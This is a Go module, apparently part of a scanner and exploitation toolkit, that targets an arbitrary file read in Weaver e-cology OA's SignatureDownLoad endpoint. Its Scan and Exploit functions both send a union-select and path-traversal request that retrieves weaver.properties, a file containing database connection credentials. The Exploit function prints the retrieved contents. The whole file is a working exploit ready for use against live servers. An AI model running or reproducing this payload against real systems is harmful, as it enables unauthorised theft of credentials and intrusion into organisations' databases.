package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wc01 struct {
}

func (c *Wc01) Scan(targetUrl string) {
	vulnerable, err := Wc01scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc01] 存在SignatureDownLoad 任意文件读取")
	} else {
		color.White("[Wc01] 不存在SignatureDownLoad 任意文件读取")
	}
}

func (*Wc01) Exploit(targetUrl string) {
	runResult, err := Wc01runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc01scancore(targetUrl string) (bool, error) {
	url := "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "jdbc") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc01runcore(targetUrl string) (string, error) {
	url := "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "jdbc") {
		return "存在SignatureDownLoad 任意文件读取\n" + resContent, nil
	} else {
		return "", nil
	}
}
